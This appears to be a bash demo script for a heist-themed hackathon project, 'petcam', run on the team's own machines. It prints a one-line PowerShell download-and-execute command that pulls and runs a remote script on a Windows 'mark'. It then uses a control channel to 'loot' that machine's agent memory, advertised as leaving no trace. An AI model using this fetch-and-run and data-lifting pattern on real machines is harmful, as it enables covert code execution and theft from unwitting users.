#!/usr/bin/env bash
# petcam demo script (RowdyHacks XII — heist). ~3 min, runs on the 5090.
# Assumes: petcam services running, laptop on the tailnet (or placeholder mark).
set -e
HERE="$(cd "$(dirname "$0")" && pwd)"

banner() { echo; echo "=== $1 ==="; echo; }

banner "1. HQ is live"
systemctl --user is-active petcam-receiver petcam-brain
curl -s http://100.86.251.100:9101/state; echo

banner "2. The mark comes online (on the Windows laptop, ONE line, zero-install):"
echo '  iex (irm "http://100.86.251.100:9101/native.ps1")'
echo "  (placeholder mark is on by default: petcam-placeholder service)"
sleep 4
echo "pet status:"; omarchy-shell pets status | python3 -c "import json,sys; d=json.load(sys.stdin); print('  state:', d['state'], '| thought:', d['thought'])"

banner "3. The score (control channel — event-driven):"
echo "  sending: think"
echo '{"cmd":"think","text":"crew, the mark is awake — eyes on the vault"}' > "$HERE/cmd.json"
sleep 3
omarchy-shell pets status | python3 -c "import json,sys; d=json.load(sys.stdin); print('  pet says:', d['thought'])"

banner "4. The loot (lift the mark's agent memory, data-only):"
echo '{"cmd":"loot"}' > "$HERE/cmd.json"
sleep 3
omarchy-shell pets status | python3 -c "import json,sys; d=json.load(sys.stdin); print('  pet says:', d['thought'])"

banner "5. Eval numbers:"
python3 "$HERE/evals/loot_eval.py" | tail -3

banner "6. Clean getaway:"
echo "  (close the sender window on the mark — nothing was installed, nothing lingers)"
echo "  demo complete: we descended, we ascended with the loot."
